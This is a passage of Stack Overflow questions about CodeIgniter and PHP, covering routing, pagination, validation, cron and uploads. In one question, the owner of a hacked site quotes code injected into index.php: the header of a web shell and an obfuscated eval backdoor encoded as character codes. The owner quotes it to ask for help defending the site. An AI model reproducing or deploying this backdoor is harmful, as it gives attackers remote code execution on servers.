&lt;input type=\"hidden\" name=\"recaptcha_response_field\" value=\"manual_challenge\"/&gt;\n    &lt;/noscript&gt;';\n}\n\n\n\n\n/**\n * A ReCaptchaResponse is returned from recaptcha_check_answer()\n */\nclass ReCaptchaResponse {\n        var $is_valid;\n        var $error;\n}\n\n\n/**\n  * Calls an HTTP POST function to verify if the user's guess was correct\n  * @param string $privkey\n  * @param string $remoteip\n  * @param string $challenge\n  * @param string $response\n  * @param array $extra_params an array of extra variables to post to the server\n  * @return ReCaptchaResponse\n  */\nfunction recaptcha_check_answer ($privkey, $remoteip, $challenge, $response, $extra_params = array())\n{\n    if ($privkey == null || $privkey == '') {\n        die (\"To use reCAPTCHA you must get an API key from &lt;a href='https://www.google.com/recaptcha/admin/create'&gt;https://www.google.com/recaptcha/admin/create&lt;/a&gt;\");\n    }\n\n    if ($remoteip == null || $remoteip == '') {\n        die (\"For security reasons, you must pass the remote ip to reCAPTCHA\");\n    }\n\n\n\n        //discard spam submissions\n        if ($challenge == null || strlen($challenge) == 0 || $response == null || strlen($response) == 0) {\n                $recaptcha_response = new ReCaptchaResponse();\n                $recaptcha_response-&gt;is_valid = false;\n                $recaptcha_response-&gt;error = 'incorrect-captcha-sol';\n                return $recaptcha_response;\n        }\n\n        $response = _recaptcha_http_post (RECAPTCHA_VERIFY_SERVER, \"/recaptcha/api/verify\",\n                                          array (\n                                                 'privatekey' =&gt; $privkey,\n                                                 'remoteip' =&gt; $remoteip,\n                                                 'challenge' =&gt; $challenge,\n                                                 'response' =&gt; $response\n                                                 ) + $extra_params\n                                          );\n\n        $answers = explode (\"\\n\", $response [1]);\n        $recaptcha_response = new ReCaptchaResponse();\n\n        if (trim ($answers [0]) == 'true') {\n                $recaptcha_response-&gt;is_valid = true;\n        }\n        else {\n                $recaptcha_response-&gt;is_valid = false;\n                $recaptcha_response-&gt;error = $answers [1];\n        }\n        return $recaptcha_response;\n\n}\n\n/**\n * gets a URL where the user can sign up for reCAPTCHA. If your application\n * has a configuration page where you enter a key, you should provide a link\n * using this function.\n * @param string $domain The domain where the page is hosted\n * @param string $appname The name of your application\n */\nfunction recaptcha_get_signup_url ($domain = null, $appname = null) {\n    return \"https://www.google.com/recaptcha/admin/create?\" .  _recaptcha_qsencode (array ('domains' =&gt; $domain, 'app' =&gt; $appname));\n}\n\nfunction _recaptcha_aes_pad($val) {\n    $block_size = 16;\n    $numpad = $block_size - (strlen ($val) % $block_size);\n    return str_pad($val, strlen ($val) + $numpad, chr($numpad));\n}\n\n/* Mailhide related code */\n\nfunction _recaptcha_aes_encrypt($val,$ky) {\n    if (! function_exists (\"mcrypt_encrypt\")) {\n        die (\"To use reCAPTCHA Mailhide, you need to have the mcrypt php module installed.\");\n    }\n    $mode=MCRYPT_MODE_CBC;   \n    $enc=MCRYPT_RIJNDAEL_128;\n    $val=_recaptcha_aes_pad($val);\n    return mcrypt_encrypt($enc, $ky, $val, $mode, \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\");\n}\n\n\nfunction _recaptcha_mailhide_urlbase64 ($x) {\n    return strtr(base64_encode ($x), '+/', '-_');\n}\n\n/* gets the reCAPTCHA Mailhide url for a given email, public key and private key */\nfunction recaptcha_mailhide_url($pubkey, $privkey, $email) {\n    if ($pubkey == '' || $pubkey == null || $privkey == \"\" || $privkey == null) {\n        die (\"To use reCAPTCHA Mailhide, you have to sign up for a public and private key, \" .\n             \"you can do so at &lt;a href='http://www.google.com/recaptcha/mailhide/apikey'&gt;http://www.google.com/recaptcha/mailhide/apikey&lt;/a&gt;\");\n    }\n\n\n    $ky = pack('H*', $privkey);\n    $cryptmail = _recaptcha_aes_encrypt ($email, $ky);\n\n    return \"http://www.google.com/recaptcha/mailhide/d?k=\" . $pubkey . \"&amp;c=\" . _recaptcha_mailhide_urlbase64 ($cryptmail);\n}\n\n/**\n * gets the parts of the email to expose to the user.\n * eg, given johndoe@example,com return [\"john\", \"example.com\"].\n * the email is then displayed as john...@example.com\n */\nfunction _recaptcha_mailhide_email_parts ($email) {\n    $arr = preg_split(\"/@/\", $email );\n\n    if (strlen ($arr[0]) &lt;= 4) {\n        $arr[0] = substr ($arr[0], 0, 1);\n    } else if (strlen ($arr[0]) &lt;= 6) {\n        $arr[0] = substr ($arr[0], 0, 3);\n    } else {\n        $arr[0] = substr ($arr[0], 0, 4);\n    }\n    return $arr;\n}\n\n/**\n * Gets html to display an email address given a public an private key.\n * to get a key, go to:\n *\n * http://www.google.com/recaptcha/mailhide/apikey\n */\nfunction recaptcha_mailhide_html($pubkey, $privkey, $email) {\n    $emailparts = _recaptcha_mailhide_email_parts ($email);\n    $url = recaptcha_mailhide_url ($pubkey, $privkey, $email);\n\n    return htmlentities($emailparts[0]) . \"&lt;a href='\" . htmlentities ($url) .\n        \"' onclick=\\\"window.open('\" . htmlentities ($url) . \"', '', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=500,height=300'); return false;\\\" title=\\\"Reveal this e-mail address\\\"&gt;...&lt;/a&gt;@\" . htmlentities ($emailparts [1]);\n\n}\n\n\n?&gt;\n</code></pre>\n\n<p>So how can i solve this issue?</p>\n"},{"tags":["php","codeigniter","constructor"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12299363,"title":"CodeIgniter use model from model's constructor","body":"<p>I have two models, first one is dependent on the second one, and I need to call methods from the second one in the first one's constructor.</p>\n\n<p>So far I have this:</p>\n\n<p><strong>user</strong></p>\n\n<pre><code>class User extends CI_Model {\n\n    protected $_attributes = array();\n\n    function __construct() {\n        parent::__construct();\n        $this-&gt;load-&gt;model('musers');\n        foreach($this-&gt;musers-&gt;GetProfile() as $key =&gt; $val) {\n            $this-&gt;_attributes[$key] = $val;\n        }\n    }\n\n    function __set($key, $val) {\n        return $this-&gt;_attributes[$key] = $val;\n    }\n\n    function __get($key) {\n        return $this-&gt;_attributes[$key];\n    }\n}\n</code></pre>\n\n<p>I have put this model in the <code>autoload</code> config file and here's what I get:</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: Notice\nMessage: Undefined index: load\nFilename: models/user.php\nLine Number: 20\n\nFatal error: Call to a member function model() on a non-object in  path\\to\\models\\user.php on line 9\n</code></pre>\n\n<p>There's also something strange - the first error (notice) refers to line <code>return $this-&gt;_attributes[$key];</code> while it surely should reference line <code>$this-&gt;load-&gt;model('musers');</code>.</p>\n\n<p>I have tried loading model <code>musers</code> in autoload before the <code>user</code> model, but nothing helps. I have tried searching for this, but could not formulate the query well, I'm sure there are solutions to my problem.</p>\n\n<p>As I understand this is because the constructor of the second model is called before CodeIgniter manages to load the loader class itself, but that's pretty odd.</p>\n"},{"tags":["ajax","codeigniter","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1096,"score":0,"question_id":1347702,"title":"Show only next and previous link in condeigniter pagination","body":"<p>I use codeigniter pagination class in my project it's works fine for me . But there is no option to tell class just show next and previous link , \nplease see this image I want to show result paged plus I'd like to use to link for next and previous instead of numeric links and when the user click on the next button I'll use Ajax to retrieve request I don't have problem with Ajax calls in pagination in numeric links but I want to just show this to link :) \nI don't think I can explain what I need very good so please see the image . \n<a href=\"http://codeigniter.com/?ACT=51&amp;fid=49&amp;aid=8091_krzfEcaTDxIidJAzqMrj&amp;thumb=1&amp;board_id=2\" rel=\"nofollow\">link text</a></p>\n\n<p>Here is my view file : </p>\n\n<pre><code>&lt;div style=\"height:200px; position:relative\"&gt;\n                      &lt;div id=\"left_nav\"&gt;&lt;/div&gt;\n                      &lt;div id=\"right_nav\"&gt;&lt;/div&gt;\n                          &lt;div style=\"width:622px;margin:0 auto;\"&gt;\n                          &lt;!-- Gallery Box1 --&gt;\n                          &lt;?php foreach($last_profile as $l) : ?&gt;\n                          &lt;div id=\"galleryBoxHolder\"&gt;\n                            &lt;div id=\"galleryBoxContent\"&gt;\n                                &lt;div id=\"ImageHolder\"&gt;\n                                    &lt;img src=\"dummy_data/1.gif\" /&gt;                              &lt;/div&gt;\n                                &lt;br /&gt;\n                                &lt;p&gt;&lt;?=$l-&gt;artname?&gt; &lt;/p&gt;\n                                &lt;br /&gt;\n                              &lt;p style=\"color:#1a4688\"&gt;asdasd&lt;/p&gt;\n\n                                &lt;p style=\"color:#1a4688 ; direction:ltr\"&gt;&lt;?=$l-&gt;length?&gt; cm x &lt;?=$l-&gt;width?&gt; cm&lt;/p&gt;\n                            &lt;/div&gt;\n                          &lt;/div&gt;\n                          &lt;?php endforeach ;?&gt;\n                          &lt;div&gt;\n                          &lt;?=$links?&gt;\n                          &lt;/div&gt;\n                      &lt;!-- Gallery box1 :off --&gt;\n\n                        &lt;/div&gt;\n                    &lt;/div&gt;\n</code></pre>\n\n<p>Please Check This <a href=\"http://rads.stackoverflow.com/amzn/click/0198600925\" rel=\"nofollow\">url</a> which is exactly what I need (@:title Customers Who Bought This Item Also Bought) </p>\n"},{"tags":["php",".htaccess","codeigniter","redmine"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":10254224,"title":"custom URL mappings in codeigniter like redmine?","body":"<p>So redmine has a very peculiar url mapping style that i observed :</p>\n\n<pre><code>http://demo.redmine.org/projects/&lt;project-name&gt;/controller/action\n</code></pre>\n\n<p>samples : </p>\n\n<pre><code>http://demo.redmine.org/projects/produto/activity\nhttp://demo.redmine.org/projects/produto/issues/new\nhttp://demo.redmine.org/projects/produto/issues/gantt\nhttp://demo.redmine.org/projects/produto/files\n</code></pre>\n\n<p>and the url changes as the project changes.</p>\n\n<p>how do i do this in codeigniter ? I'm thinking it can be done with routes.php but so far i'm not able to get anywhere.</p>\n\n<p>Looking for any help. Thanks.</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12294527,"title":"Passing variable from controller to view in CodeIgniter","body":"<p>I'm new to Codeigniter and OOP PHP.</p>\n\n<p>Controller:</p>\n\n<pre><code>public function index(){\n    $this-&gt;load-&gt;model('main_model');\n    $planet = $this-&gt;main_model-&gt;solar();\n    $this-&gt;load-&gt;view('main_view', $planet);    \n    }\n</code></pre>\n\n<p>If <code>echo $planet</code> in the controller it does what it's supposed to do.  If I <code>echo $planet</code> in the view I get an undefined variable error.  <code>$planet</code> is not an array.  Why isn't the <code>$planet</code> variable being passed to the view?</p>\n\n<p>I know this is a simple and basic question and I'm embarrassed that I can't figure out what I'm doing wrong.</p>\n\n<p>EDIT:  Okay, after more fiddling around, I got it to work.  Can variables only be passed from Controller to View when they're formatted as an array?</p>\n"},{"tags":["codeigniter","pagination"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":73,"score":-3,"question_id":12280945,"title":"codeigniter pagination Numbers not displayed correcly","body":"<p>Codeigniter pagination Numbers not displayed correcly in result page,.</p>\n\n<p>Plz help me.</p>\n\n<p>/<em>controller page code</em>/</p>\n\n<pre><code>  function search_all()\n  {\n    $this-&gt;load-&gt;view(‘prd’); \n  $config = array();\n  $config[‘base_url’] =  base_url().’/product_search/search_all’;\n  $config[“total_rows”] = $this-&gt;search_product_model-&gt;record_count();\n    $config[“per_page”] = 8;\n    $config[“uri_segment”] = 3;\n\n    $this-&gt;pagination-&gt;initialize($config);\n\n    $page = ($this-&gt;uri-&gt;segment(3)) ? $this-&gt;uri-&gt;segment(3) : 0;\n    $data[“results”] = $this-&gt;search_product_model-&gt;\n    get_search($config[“per_page”], $page);\n    $data[“links”] = $this-&gt;pagination-&gt;create_links();\n\n    //$this-&gt;load-&gt;view(“example1”, $data);\n  $this-&gt;load-&gt;view(‘asd’, $data);\n  }\n</code></pre>\n"},{"tags":["php","codeigniter","session","xml-rpc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12290977,"title":"stateful xml-rpc service / php","body":"<p>I'm creating a XML-RPC client and server that's going to be using a pre-shared key mechanism to maintain the trust between the client and the server; both client and server are web applications written in PHP that communicates through the HTTP protocol.\nTo be more specific, the client is a Moodle plugin and the server is our school resource management system.</p>\n\n<p>If the authentication is successful, the server will generate and return a temporary link that allows the end-user to log into our resource management system from moodle, bypassing our application authentication mechanism so the user doesn't have to input his credentials twice.</p>\n\n<p>The client needs to call two different functions in this process (Auth1 and Auth2), if the authentication is successful the client will return a special link that allows the moodle user to log into our school management system through Moodle.</p>\n\n<p>I wanted it to work as following:</p>\n\n<blockquote>\n  <p>1) Both the Client and Server must know the same passphrase;</p>\n  \n  <p>2) The Client (Moodle plugin) calls the function Auth1 on the server\n  and pass as parameters a <strong>random sequence A</strong> of alpha-numeric digits\n  and the <strong>username</strong> that he's requesting the link;</p>\n  \n  <p>3) The Server creates a session, generates a <strong>random sequence B</strong> of\n  alpha-numeric digits, send it to the client and store both the\n  username, random sequence A and B in the session variable:</p>\n  \n  <p>4) The Client calls the function Auth2 and pass sha(random sequence A\n  . random sequence B . pre-shared-key) as a parameter;</p>\n  \n  <p>5) The Server compare the received parameter against his own\n  sha(random sequence A . random sequence B . pre-shared-key). If the\n  parameter received is the same of his sha, he sends a link to the\n  client; if it's not, it sends an empty string.</p>\n</blockquote>\n\n<p>I can sucessfully call the function Auth1, but when I call the function Auth2, I notice that the server isn't receiving a session.</p>\n\n<p>This way I can authenticate the client and the server without sending the passphrase in plain, similarly to what's done with WPA-PSK.</p>\n\n<p>I'm using <a href=\"http://code.google.com/p/ripcord/\" rel=\"nofollow\">ripcord</a> in the client side and codeigniter's xmlrpc's library in the server.</p>\n\n<p>How can I keep a session between XML-RPC calls?</p>\n"},{"tags":["php","security","codeigniter","codeigniter-2","injection"],"answer_count":3,"favorite_count":7,"up_vote_count":9,"down_vote_count":1,"view_count":336,"score":8,"question_id":12264125,"title":"Codeigniter application getting hacked, code injected in index.php ","body":"<p>I have a codeigniter 2.0.2 project that keeps getting hacked. There are two main issues:</p>\n\n<ul>\n<li>Malicious code is being added to the start of the <code>index.php</code> file</li>\n<li>Rogue files are added to the server</li>\n</ul>\n\n<p>According to the host there are no FTP logs to indicate these files were uploaded.</p>\n\n<ol>\n<li><p>As there are no FTP upload logs related to the rogue files - does this mean it must be an exploit via the site itself e.g. a contact or upload form?</p></li>\n<li><p>The site is on shared hosting - code it be a site on the same server is also getting hacked and this is causing the problems?</p></li>\n<li><p>Would it help if I change the filename of index.php to something else?</p></li>\n<li><p>As the <code>index.php</code> is getting modified should I CHMOD it to 644?</p></li>\n<li><p>I've been looking for what the suggested permissions are for codeigniter projects but not sourced any yet. I was thinking 644 across the site apart from the upload/logs directory (777) - does this sound okay?</p></li>\n</ol>\n\n<p>Code injected to the top of the <code>index.php</code> file:</p>\n\n<p><code>&lt;?php if(isset($_GET[\"t6371n\"])){ $auth_pass=\"\";$color=\"#df5\";$default_action=\"FilesMan\";$default_use_ajax=true;$default_charset=\"Windows-</code></p>\n\n<p>which is then followed by a long preg_replace statement with a long encoded string. This is followed by a second statement:</p>\n\n<p><code>if(isset($_GET[\"w6914t\"])){$d=substr(8,1);foreach(array(36,112,61,64,36,95,80,79,83,84,91,39,112,49,39,93,59,36,109,61,115,112,114,105,110,116,102,40,34,37,99,34,44,57,50,41,59,105,102,40,115,116,114,112,111,115,40,36,112,44,34,36,109,36,109,34,41,41,123,36,112,61,115,116,114,105,112,115,108,97,115,104,101,115,40,36,112,41,59,125,111,98,95,115,116,97,114,116,40,41,59,101,118,97,108,40,36,112,41,59,36,116,101,109,112,61,34,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,115,116,121,108,101,46,100,105,115,112,108,97,121,61,39,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,105,110,110,101,114,72,84,77,76,61,39,34,46,97,100,100,99,115,108,97,115,104,101,115,40,104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115,40,111,98,95,103,101,116,95,99,108,101,97,110,40,41,41,44,34,92,110,92,114,92,116,92,92,39,92,48,34,41,46,34,39,59,92,110,34,59,101,99,104,111,40,115,116,114,108,101,110,40,36,116,101,109,112,41,46,34,92,110,34,46,36,116,101,109,112,41,59,101,120,105,116,59)as$c){$d.=sprintf((substr(urlencode(print_r(array(),1)),5,1).c),$c);}eval($d);}</code></p>\n\n<p>There is a contact form and a form where a user can upload items using CKFinder 2.0.1. Going to update this and see if that resolves it.</p>\n"},{"tags":["codeigniter","path","directory","root"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12293910,"title":"File path in CodeIgniter","body":"<p>Im having a hard time with a link to a video file in one of my CI views.</p>\n\n<p>Videos folder is in CodeIgniter root directory. When I link the video file name as following, everything works fine. </p>\n\n<pre><code>&lt;source type=\"video/mp4\" src=\"/videos/&lt;?= $video-&gt;filename ?&gt;\" /&gt;\n</code></pre>\n\n<p>But I need to be able to link a file, that is outside of CI root folder, for example somewhere else on C disk, like C:/videos. Cant figure out how to do it. Thanks in advance.</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>Ill be a little bit more specific.</p>\n\n<p>My codeigniter app will be placed on a server in WEB directory: </p>\n\n<pre><code>/something1/something2/web/\n</code></pre>\n\n<p>Now Video Files folder will be placed on a same level as WEB folder:  </p>\n\n<pre><code>/something1/something2/videos/\n</code></pre>\n\n<p>I want to link videos that are in Videos folder, which is on a same level as WEB(CI root) folder.</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12293411,"title":"How to Facebook login with associated user record in our system","body":"<p>We have our own registration and login system.</p>\n\n<p>Many of our users are users of facebook and often forget login details to our site so it would be good if they could login to our site using their FB account.</p>\n\n<p>What would be the simplest way to associate their FB account with their user record in our system.</p>\n\n<p>I guess there is no way to avoid a double login for the first time? i.e. login to facebook, then login to our system so they are paired so to speak. We store their facebook id in their user record and future visits would only require a FB login.</p>\n\n<p>Any opinions or suggestions very welcome.</p>\n"},{"tags":["php","codeigniter","codeigniter-routing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":12282450,"title":"codeigniter and cpanel installation","body":"<p>I am completely new to moving codeigniter to my web-server and im having trouble with the configuration. Where do I place my codeigniter project folder in www under myurl.com in in the very root directory? Am i supposed to move out the application and system folders?</p>\n\n<p>I am trying to remove index.php? from my URL name where do i place my .htaccess file in the root or in the same folder as my codeigniter directory?</p>\n\n<p>I wish to be able to type in (www.myurl.com) and be redirected to my home_controller/index\nis this possible?</p>\n\n<p><img src=\"http://i.stack.imgur.com/dCuvv.png\" alt=\"enter image description here\"></p>\n\n<p><em>below is my .htaccess file in it's entirety</em></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /MMSFL/\n\n\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\n\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L,QSA]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n\n\nErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<h2>I have also made the following changes in config/routes</h2>\n\n<pre><code>    $config['index_page'] = \"\";\n    $config['base_url'] = \"http://myurl.com/\";\n    $config['server_root'] = $_SERVER['DOCUMENT_ROOT'];\n    $config['uri_protocol'] = 'AUTO';\n\n$route['default_controller'] = \"home_controller\";\n</code></pre>\n"},{"tags":["php","forms","mvc","validation","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":661,"score":0,"question_id":7229878,"title":"CodeIgniter: Form Validation Problem","body":"<p>I am using CodeIgniter to validate the form. Once the form is submitted and there's some validation error, I want to form to remember the input fields values. At the moment, I validate all fields at once and it works fine (ie. I can get the input fields values in the form if the validation fails.</p>\n\n<p><strong>The following code works fine:</strong></p>\n\n<p><strong>View:</strong></p>\n\n<pre><code>&lt;?php if ( form_error('name') ) { ?&gt;\n    &lt;input type=\"text\" class=\"error\" name=\"name\" value=\"&lt;?php echo set_value('name'); ?&gt;\"/&gt;\n    &lt;?php echo form_error('name', '&lt;p class=\"error\"&gt;', '&lt;/p&gt;'); \n} else { ?&gt;\n    &lt;input type=\"text\" name=\"name\" value=\"&lt;?php echo set_value('name'); ?&gt;\"/&gt;\n&lt;?php } ?&gt;\n</code></pre>\n\n<p><strong>Controller:</strong></p>\n\n<pre><code>function validate_form{\n\n    $this -&gt; form_validation -&gt; set_rules( 'name', 'name', 'trim|required|' );\n    $this -&gt; form_validation -&gt; set_rules( 'email', 'Email', 'trim|required|callback_email_available' );\n    $this -&gt; form_validation -&gt; set_rules( 'captcha', 'captcha', 'callback_check_captcha' );\n\n    if ( $this -&gt; form_validation -&gt; run() === FALSE ) \n    {\n        $this -&gt; load -&gt; view( 'signup_view' );\n    }\n    else\n    {\n        //process form and insert to db.\n    }   \n}\n</code></pre>\n\n<p><strong>My Problem:</strong></p>\n\n<p>Now, Instead of above approach (to validate all fields at once), I want to validate only one field 'captcha' at first. So If the captcha field is validated, then i want to valiate the other fields. Otherwise i want to return to form and display the captcha error, but I want to keep the other fields values the input fields, so that the user don't have to type again.</p>\n\n<p>I am trying following code, but it does not work fine. For example, when I submit the form, the fields dont seem to remember the values.\nThe view code is same as above.</p>\n\n<p><strong>Code which I am trying and is not working:</strong></p>\n\n<pre><code>$this -&gt; form_validation -&gt; set_rules( 'captcha', 'captcha', 'callback_check_captcha' );\n\nif ( $this -&gt; form_validation -&gt; run() === FALSE ) \n    {\n        $this -&gt; load -&gt; view( 'signup_view' );\n    }   \nelse\n    {\n    $this -&gt; form_validation -&gt; set_rules( 'name', 'Name', 'trim|required|' );\n    $this -&gt; form_validation -&gt; set_rules( 'email', 'Email', 'trim|required|callback_email_available' );\n\n        if ( $this -&gt; form_validation -&gt; run() === FALSE ) \n            {\n                $this -&gt; load -&gt; view( 'signup_view' );\n            }\n        else\n            {\n            //process form and insert to db.\n        }\n\n    }\n</code></pre>\n"},{"tags":["php","codeigniter","cron"],"answer_count":5,"favorite_count":10,"up_vote_count":9,"down_vote_count":0,"view_count":7872,"score":9,"question_id":2287070,"title":"How to run a CodeIgniter file through CRON?","body":"<p>I've tried the following method in the past:</p>\n\n<pre><code>&lt;?php\nset_time_limit(0);\n$_SERVER['PATH_INFO'] = 'cron/controller/index';\n$_SERVER['REQUEST_URI'] = 'cron/controller/index';\nrequire_once('index.php');\n?&gt;\n</code></pre>\n\n<p>and putting this in a file in the codeigniter installation directory, calling it cron.php, and then invoking it via:</p>\n\n<pre><code>php /home/[username]/public_html/my_project/cron.php\n</code></pre>\n\n<p>If I type the URL to cron.php in my browser it works perfectly, however whenever its run via CRON I get a 404 error. Putting the following code in the <code>show_404()</code> function of CodeIgniter</p>\n\n<pre><code>function show_404($page = '')\n{\n   print_r($_SERVER);\n   echo \"\\n\\n\";\n   die ($page);\n}\n</code></pre>\n\n<p>results in getting the following output emailed to me:</p>\n\n<pre><code>Array\n(\n   [SHELL] =&gt; /bin/sh\n   [MAILTO] =&gt; me@gmail.com\n   [USER] =&gt; [me]\n   [PATH] =&gt; /usr/bin:/bin\n   [PWD] =&gt; /home/[me]\n   [SHLVL] =&gt; 1\n   [HOME] =&gt; /home/[me]\n   [LOGNAME] =&gt; [me]\n   [_] =&gt; /usr/bin/php\n   [PHP_SELF] =&gt;\n   [REQUEST_TIME] =&gt; 1266479641\n   [argv] =&gt; Array\n       (\n           [0] =&gt; /home/[me]/public_html/my_project/cron.php\n       )\n\n   [argc] =&gt; 1\n   [PATH_INFO] =&gt; cron/controller/index\n   [REQUEST_URI] =&gt; cron/controllers/index\n)\n\n\nhome/[me]\n</code></pre>\n\n<p>Here I've [me] in place of my actual username.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["php","validation","codeigniter"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":5846,"score":1,"question_id":1120901,"title":"Codeigniter Form Validation...form re-population","body":"<p>I am in the process of creating an input form on a record specific page e.g. (property/rentals/rec_id). On submission, the data should be inserted, validated and return to the original page from which it was sent with any relevant messages. </p>\n\n<ul>\n<li>If the validation fails, reload the form page a re-populate the form</li>\n<li><p>Echo the specific validation error - e.g. invalid email address etc</p></li>\n<li><p>If successful, insert data, reload the page and display success message.</p>\n\n<p>function class() {</p>\n\n<p>$this->load->library('form_validation');\t\n\t$this->form_validation->set_rules('name','name','required|trim');\n\t$this->form_validation->set_rules('email','email','required|trim|valid_email');</p>\n\n<pre><code>$fields['name']\t= 'Name';\n$fields['email'] = 'Email Address';\n\n\n$this-&gt;validation-&gt;set_fields($fields);\n\n\nif ($this-&gt;form_validation-&gt;run() == FALSE) \n{\n\t//failed - reload page and re-populate fields with any error messages\n}\nelse\n{\n     // display form with success message\n}\n</code></pre>\n\n<p>}</p></li>\n</ul>\n\n<p>Normally this is simply done by 'loading a view' and passing the relevant data to repopulate the page, fields or display messages. But I have to use a 'redirect' back to the product specific page. Is there any good way to do this other than using session data to carry the validation errors..?</p>\n\n<p>Thanks in advance, Michael</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":36,"score":-1,"question_id":12289384,"title":"codeigniter - how to safely sanatise input/output - strip html, etc","body":"<p>What is the best method for stripping out html etc from submitted data using codeigniter?</p>\n\n<p>(i don't mean to sanatise it for the database)</p>\n\n<p>Are there built in methods of doing something like htmlpurifier? </p>\n"},{"tags":["apache",".htaccess","codeigniter","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":12291999,"title":"How to remove index.php in codeigniter when changing root directory?","body":"<p>I've got moved the Application and System folders below the root directory as described here. <a href=\"http://codeigniter.com/user_guide/installation/index.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/installation/index.html</a> But I'm not sure how to get the urls to work properly with the new directory locations.</p>\n\n<pre><code>/root/var/\n    `-- www\n        |-- siteroot\n        |       |-- .htaccess\n        |       |-- index.php\n        |       |-- style.css\n        |       |-- script.js\n        |-- application/\n        |-- system/\n</code></pre>\n\n<p>currently this way\n<a href=\"http://example.com/index.php/about\" rel=\"nofollow\">http://example.com/index.php/about</a></p>\n\n<p>this is the way I want it but currently it shows a 404\n<a href=\"http://example.com/about\" rel=\"nofollow\">http://example.com/about</a></p>\n\n<p>this is my current .htaccess file. It removed the index.php before I moved the folders below the root, now it will still remove the index.php but none of the controllers work without the index.php</p>\n\n<pre><code>################################################\n#other hacks can be found at http://codeigniter.com/wiki/mod_rewrite/\n\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n\n    RewriteCond %{REQUEST_URI} ^../system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n\n    RewriteCond %{REQUEST_URI} ^../application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n\n################################################\n#http://codeigniter.com/forums/viewthread/92609/\n</code></pre>\n"},{"tags":["codeigniter","fonts","upload","mime"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":5536,"score":4,"question_id":5128069,"title":"TTF MIME type?","body":"<p>I can't find correct MIME type for TrueType fonts. I need it because I'm using File Uploading Class (CodeIgniter) to upload files, and I want to allow only TTF to be uploaded. Tried this:</p>\n\n<pre><code>'ttf'   =&gt;  'font/ttf'\n'ttf'   =&gt;  'font/truetype'\n</code></pre>\n\n<p>With no success.</p>\n\n<p>Any ideas ?</p>\n"},{"tags":["codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12290814,"title":"Uploading an image with Code Igniter?","body":"<p>I'm trying to set a site up so I can upload images using a web form in Code Igniter(CI). I'm not getting any errors but the file is not being saved either. I wanted to know if those that were successful in uploading images could help explain what might be the issue?</p>\n\n<pre><code>View:\n&lt;?php\n    echo form_open_multipart('admin/galleryUpload') . \"\\n\";\n    echo \"&lt;div class='span-8'&gt;&lt;span class='text'&gt;Image:&lt;/span&gt;\" . form_upload('uploadImg') . \"&lt;/div&gt;\";\n    foreach ($gallery as $picture)\n    {\n        $order[] = $picture-&gt;order;\n    }\n    $order[] = count($order) + 